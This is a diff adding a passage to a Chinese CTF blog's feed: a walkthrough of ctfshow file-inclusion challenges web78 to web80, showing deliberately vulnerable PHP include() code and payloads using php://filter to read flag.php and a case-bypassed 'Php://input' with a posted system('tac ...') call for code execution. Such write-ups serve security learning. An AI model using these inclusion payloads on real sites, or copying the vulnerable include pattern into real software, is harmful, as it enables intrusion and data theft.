@@ -2603,6 +2603,29 @@ exp：</p>
 <img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/Web1000%28%E4%B8%80%29/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/web124/T%29W51CB%29N5TQ4%5B66Y8EECDJ.png" alt=""><br>
 成功获得flag</p>
 <h2 id="文件包含-78-88-116-117"><a class="header-anchor" href="#文件包含-78-88-116-117">¶</a>文件包含(78-88&amp;116-117)</h2>
+<h3 id="web78"><a class="header-anchor" href="#web78">¶</a>web78</h3>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">&#x27;file&#x27;</span>]))&#123;</span><br><span class="line">    $file = $_GET[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line">    <span class="keyword">include</span>($file);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>开始文件包含的题型了，这里使用php伪协议php://filter来构造paylaod</p>
+<blockquote>
+<p>首先这是一个file关键字的get参数传递，php://是一种协议名称，php://filter/是一种访问本地文件的协议，/read=convert.base64-encode/表示读取的方式是base64编码后，resource=index.php表示目标文件为index.php。</p>
+<p>通过传递这个参数可以得到index.php的源码，下面说说为什么，看到源码中的include函数，这个表示从外部引入php文件并执行，如果执行不成功，就返回文件的源码。</p>
+<p>而include的内容是由用户控制的，所以通过我们传递的file参数，是include（）函数引入了index.php的base64编码格式，因为是base64编码格式，所以执行不成功，返回源码，所以我们得到了源码的base64格式，解码即可。</p>
+</blockquote>
+<p>payload如下</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?file&#x3D;php:&#x2F;&#x2F;filter&#x2F;convert.base64-encode&#x2F;resource&#x3D;flag.php</span><br></pre></td></tr></table></figure>
+<p>读取出来是base64，再拿去进行base64解码即可得到flag</p>
+<h3 id="web79"><a class="header-anchor" href="#web79">¶</a>web79</h3>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">&#x27;file&#x27;</span>]))&#123;</span><br><span class="line">    $file = $_GET[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line">    $file = str_replace(<span class="string">&quot;php&quot;</span>, <span class="string">&quot;???&quot;</span>, $file);</span><br><span class="line">    <span class="keyword">include</span>($file);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>这次把php和通配符过滤了，php伪协议大小写可以绕过，所以我们这里使用php://input伪协议，paylaod如下</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?file&#x3D;Php:&#x2F;&#x2F;input</span><br><span class="line"></span><br><span class="line">post：&lt;?php system(&quot;tac flag.php&quot;);?&gt;</span><br></pre></td></tr></table></figure>
+<p><img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/Web1000%28%E4%B8%80%29/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/web79/0C4K%40R_MQ2W%282D%40VEF%7DHV37.png" alt=""></p>
+<h3 id="web80"><a class="header-anchor" href="#web80">¶</a>web80</h3>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">&#x27;file&#x27;</span>]))&#123;</span><br><span class="line">    $file = $_GET[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line">    $file = str_replace(<span class="string">&quot;php&quot;</span>, <span class="string">&quot;???&quot;</span>, $file);</span><br><span class="line">    $file = str_replace(<span class="string">&quot;data&quot;</span>, <span class="string">&quot;???&quot;</span>, $file);</span><br><span class="line">    <span class="keyword">include</span>($file);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>这次多过滤了一个data，可以继续使用上题php:input协议，不过注意这次文件名字改了<br>
+<img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/Web1000%28%E4%B8%80%29/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/web80/~4EFI%24V_L~8E%24U_CGIDW5%5D1.png" alt=""><br>
+<img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/Web1000%28%E4%B8%80%29/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/web80/YG%60%7DUF%5D%5D~P6HJ%40~2KA4%5D949.png" alt=""><br>
+所以payload为</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?file&#x3D;Php:&#x2F;&#x2F;input</span><br><span class="line"></span><br><span class="line">post：&lt;?php system(&quot;tac fl0g.php&quot;);?&gt;</span><br></pre></td></tr></table></figure>
 ]]></content>
       <tags>
         <tag>CTF</tag>
